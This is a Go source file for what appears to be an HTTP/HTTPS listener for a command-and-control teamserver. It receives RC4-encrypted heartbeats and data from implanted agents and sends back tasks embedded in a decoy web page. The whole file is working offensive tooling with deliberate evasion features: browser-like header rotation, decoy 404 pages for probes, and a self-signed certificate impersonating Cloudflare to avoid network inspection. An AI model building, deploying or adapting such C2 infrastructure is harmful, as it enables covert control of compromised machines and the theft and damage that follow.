package main

import (
	"strconv"
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rc4"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
	"unicode"

	"github.com/gin-gonic/gin"
)

func parseRequestHeaderRules(raw string) [][2]string {
	raw = strings.ReplaceAll(raw, "\r\n", "\n")
	var rules [][2]string
	for _, line := range strings.Split(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		idx := strings.IndexByte(line, ':')
		if idx < 0 {
			continue
		}
		name := strings.TrimSpace(line[:idx])
		value := strings.TrimSpace(line[idx+1:])
		if name == "" {
			continue
		}
		rules = append(rules, [2]string{name, value})
	}
	return rules
}

func hostHeaderMatches(requestHost, configHH string) bool {
	configHH = strings.TrimSpace(configHH)
	if configHH == "" {
		return false
	}
	if strings.EqualFold(requestHost, configHH) {
		return true
	}
	if _, _, err := net.SplitHostPort(configHH); err == nil {
		return false
	}
	reqHost, _, err := net.SplitHostPort(requestHost)
	if err != nil {
		return false
	}
	return strings.EqualFold(reqHost, configHH)
}

func requestHeadersMatch(req *http.Request, raw string) bool {
	rules := parseRequestHeaderRules(raw)
	if len(rules) == 0 {
		return true
	}
	for _, kv := range rules {
		if req.Header.Get(kv[0]) != kv[1] {
			return false
		}
	}
	return true
}

type Listener struct {
	transport *TransportWS
}

type TransportWS struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    TransportConfig
	Name      string
	Active    bool
}

type TransportConfig struct {
	HostBind           string   `json:"host_bind"`
	PortBind           int      `json:"port_bind"`
	Callback_addresses []string `json:"callback_addresses"`
	EncryptKey         string   `json:"encrypt_key"`

	Ssl         bool   `json:"ssl"`
	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	HttpMethod     string   `json:"http_method"`
	Uri            []string `json:"uri"`
	ParameterName  string   `json:"hb_header"`
	UserAgent      []string `json:"user_agent"`
	HostHeader     []string `json:"host_header"`
	RequestHeaders string   `json:"request_headers"`

	ResponseHeaders    map[string]string `json:"response_headers"`
	TrustXForwardedFor bool              `json:"x-forwarded-for"`
	WebPageError       string            `json:"page-error"`
	WebPageOutput      string            `json:"page-payload"`

	Server_headers string `json:"server_headers"`
	Protocol       string `json:"protocol"`
}

func validConfig(config string) error {
	var conf TransportConfig
	err := json.Unmarshal([]byte(config), &conf)
	if err != nil {
		return err
	}

	if conf.HostBind == "" {
		return errors.New("HostBind is required")
	}
	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("PortBind must be in the range 1-65535")
	}
	if len(conf.Callback_addresses) == 0 {
		return errors.New("callback_servers is required")
	}

	for _, uriLine := range conf.Uri {
		uriLine = strings.TrimSpace(uriLine)
		if uriLine == "" {
			continue
		}
		matched, err := regexp.MatchString(`^/[a-zA-Z0-9\.\=\-]+(/[a-zA-Z0-9\.\=\-]+)*$`, uriLine)
		if err != nil || !matched {
			return fmt.Errorf("uri invalid: %s", uriLine)
		}
	}

	match, _ := regexp.MatchString("^[0-9a-f]{32}$", conf.EncryptKey)
	if len(conf.EncryptKey) != 32 || !match {
		return errors.New("encrypt_key must be 32 hex characters")
	}
	return nil
}

func (t *TransportWS) Start(ts Teamserver) error {
	var err error = nil

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.NoRoute(t.pageError)

	router.Use(func(c *gin.Context) {
		for header, value := range t.Config.ResponseHeaders {
			c.Header(header, value)
		}
		c.Next()
	})

	// HTTPS emulation: every agent exchange is a plain HTTP POST to one of the
	// configured URIs -- no upgrade, no frames. GET is registered as well so a
	// non-POST probe to a live URI gets the same decoy page as an unknown path
	// instead of gin's bare 404.
	router.POST("/*endpoint", t.processRequest)
	router.GET("/*endpoint", t.processRequest)

	t.Active = true
	t.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", t.Config.HostBind, t.Config.PortBind),
		Handler: router,
	}

	if t.Config.Ssl {
		fmt.Printf("   Started listener '%s': https://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)
		listenerPath := ListenerDataDir + "/" + t.Name
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
		}
		t.Config.SslCertPath = listenerPath + "/listener.crt"
		t.Config.SslKeyPath = listenerPath + "/listener.key"

		if len(t.Config.SslCert) == 0 || len(t.Config.SslKey) == 0 {
			err = t.generateSelfSignedCert(t.Config.SslCertPath, t.Config.SslKeyPath)
			if err != nil {
				return err
			}
		} else {
			_ = os.WriteFile(t.Config.SslCertPath, t.Config.SslCert, 0600)
			_ = os.WriteFile(t.Config.SslKeyPath, t.Config.SslKey, 0600)
		}

		cert, err := tls.LoadX509KeyPair(t.Config.SslCertPath, t.Config.SslKeyPath)
		if err != nil {
			return err
		}

		// NextProtos: the H1 agent offers ALPN [h2, http/1.1]; the server
		// accepts ONLY http/1.1 — offering "h2" here with an empty TLSNextProto
		// map crashes Go's http2 configure path (SIGSEGV in h2_bundle.go).
		// The client's JA4 is unaffected (it hashes the client offer).
		t.Server.TLSConfig = &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"http/1.1"}}
		t.Server.TLSNextProto = make(map[string]func(*http.Server, *tls.Conn, http.Handler))
		fmt.Printf("   [HTTPS-TLS] serving %s with NextProtos=%v\n", t.Name, t.Server.TLSConfig.NextProtos)

		go func() {
			err = t.Server.ListenAndServeTLS("", "")
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
			}
		}()
	} else {
		fmt.Printf("   Started listener '%s': http://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)
		go func() {
			err = t.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
			}
		}()
	}
	time.Sleep(500 * time.Millisecond)
	return err
}

func (t *TransportWS) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	listenerPath := ListenerDataDir + "/" + t.Name
	if _, err := os.Stat(listenerPath); err == nil {
		_ = os.RemoveAll(listenerPath)
	}
	return t.Server.Shutdown(ctx)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (t *TransportWS) processRequest(ctx *gin.Context) {
	var ExternalIP string

	// Plain HTTPS emulation: only POST carries agent data. Anything else gets
	// the same decoy error page as an unknown URI.
	if ctx.Request.Method != http.MethodPost {
		t.pageError(ctx)
		return
	}

	u, err := url.Parse(ctx.Request.RequestURI)
	uriValid := false
	if err == nil {
		for _, configUri := range t.Config.Uri {
			configUri = strings.TrimSpace(configUri)
			if configUri != "" && configUri == u.Path {
				uriValid = true
				break
			}
		}
	}
	if !uriValid {
		t.pageError(ctx)
		return
	}

	if t.Config.TrustXForwardedFor && ctx.Request.Header.Get("X-Forwarded-For") != "" {
		ExternalIP = ctx.Request.Header.Get("X-Forwarded-For")
	} else {
		ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
	}

	agentType, agentId, beat, err := t.parseBeat(ctx)
	if err != nil {
		t.pageError(ctx)
		return
	}

	if !Ts.TsAgentIsExists(agentId) {
		_, err = Ts.TsAgentCreate(agentType, agentId, beat, t.Name, ExternalIP, true)
		if err != nil {
			t.pageError(ctx)
			return
		}
	}

	_ = Ts.TsAgentSetTick(agentId, t.Name)

	// The session body is base64 text (the agent may pad the tail with
	// whitespace/newlines so the request looks like a form/page post), so read
	// it capped, strip every unicode space, then decode back to the encrypted
	// bytes the agent core expects. There is no init frame in this protocol --
	// the init travels in the beat header, exactly as in the WS listener.
	rawBody, err := io.ReadAll(http.MaxBytesReader(ctx.Writer, ctx.Request.Body, 64<<20))
	if err != nil {
		t.pageError(ctx)
		return
	}

	bodyData := strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, string(rawBody))

	if len(bodyData) > 0 {
		decoded, err := base64.StdEncoding.DecodeString(bodyData)
		if err != nil {
			t.pageError(ctx)
			return
		}
		if len(decoded) > 0 {
			_ = Ts.TsAgentProcessData(agentId, decoded)
		}
	}

	// Check for tasks
	responseData, err := Ts.TsAgentGetHostedAll(agentId, 0x1900000)
	finalPayload := ""
	if err == nil && len(responseData) > 0 {
		encData := base64.StdEncoding.EncodeToString(responseData)
		finalPayload = strings.Replace(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", encData, 1)
	} else {
		// No tasks pending: still answer with the template (empty payload slot)
		// so the exchange looks like an ordinary page fetch.
		finalPayload = strings.Replace(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", "", 1)
	}

	// Response headers from the listener UI are already applied by the router
	// middleware above; gin's ctx.Data only fills Content-Type when the config
	// did not pin one.
	// Explicit Content-Length (see beacon_listener_http note): gin ctx.Data
	// does not set it, so large responses would go chunked and break the
	// agent's https_recv framing.
	ctx.Writer.Header().Set("Content-Type", "text/html; charset=utf-8")
	ctx.Writer.Header().Set("Content-Length", strconv.Itoa(len(finalPayload)))
	ctx.Writer.WriteHeader(http.StatusOK)
	_, _ = ctx.Writer.Write([]byte(finalPayload))

	_ = Ts.TsAgentSetTick(agentId, t.Name)
}

func (t *TransportWS) parseBeat(ctx *gin.Context) (string, string, []byte, error) {
	// Heartbeat header rotation (H1 Phase 1b): the hb_header config accepts a
	// comma-separated list of browser-typical header names; the agent rotates
	// among them per request. Accept any name in the set.
	beat := ""
	for _, name := range strings.Split(t.Config.ParameterName, ",") {
		if v := strings.TrimSpace(ctx.Request.Header.Get(strings.TrimSpace(name))); v != "" {
			beat = v
			break
		}
	}
	if beat == "" {
		beat = ctx.Request.Header.Get("X-Beat")
	}
	if beat == "" {
		return "", "", nil, fmt.Errorf("missing heartbeat header %q", t.Config.ParameterName)
	}

	agentInfoCrypt, err := base64.StdEncoding.DecodeString(beat)
	if len(agentInfoCrypt) < 5 || err != nil {
		return "", "", nil, errors.New("failed decode beat")
	}

	encKey, err := hex.DecodeString(t.Config.EncryptKey)
	if err != nil {
		return "", "", nil, errors.New("invalid encrypt_key")
	}
	rc4crypt, errcrypt := rc4.NewCipher(encKey)
	if errcrypt != nil {
		return "", "", nil, errors.New("rc4 error")
	}

	agentInfo := make([]byte, len(agentInfoCrypt))
	rc4crypt.XORKeyStream(agentInfo, agentInfoCrypt)

	agentType := uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]
	agentId := uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), agentInfo, nil
}

func (t *TransportWS) generateSelfSignedCert(certFile, keyFile string) error {
	// ECDSA P-256: the embedded-mbedtls linux agent is an ECDSA-only build
	// (H1 trimmed config drops RSA), so the HTTPS listener cert must be ECDSA.
	privateKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return err
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return err
	}

	// Real subject fields: the embedded mbedtls client (H1) fails to parse
	// completely EMPTY issuer/subject names (x509_get_name → OUT_OF_DATA),
	// and an empty subject is also an anomaly to network inspection — use a
	// plausible CDN-style identity instead.
	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			CommonName:   "localhost",
			Organization: []string{"Cloudflare, Inc."},
			Country:      []string{"US"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	hostBind := strings.TrimSpace(t.Config.HostBind)
	if hostBind == "" || hostBind == "0.0.0.0" {
		template.DNSNames = []string{"localhost"}
		template.IPAddresses = []net.IP{net.ParseIP("127.0.0.1")}
	} else if ip := net.ParseIP(hostBind); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{hostBind}
	}

	certData, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return err
	}

	var certBuffer, keyBuffer bytes.Buffer
	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	if err != nil {
		return err
	}
	t.Config.SslCert = certBuffer.Bytes()
	os.WriteFile(certFile, t.Config.SslCert, 0644)

	keyData, err := x509.MarshalECPrivateKey(privateKey)
	if err != nil {
		return err
	}
	err = pem.Encode(&keyBuffer, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyData})
	if err != nil {
		return err
	}
	t.Config.SslKey = keyBuffer.Bytes()
	os.WriteFile(keyFile, t.Config.SslKey, 0644)

	return nil
}

func (t *TransportWS) pageError(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte(t.Config.WebPageError)
	_, _ = ctx.Writer.Write(html)
}
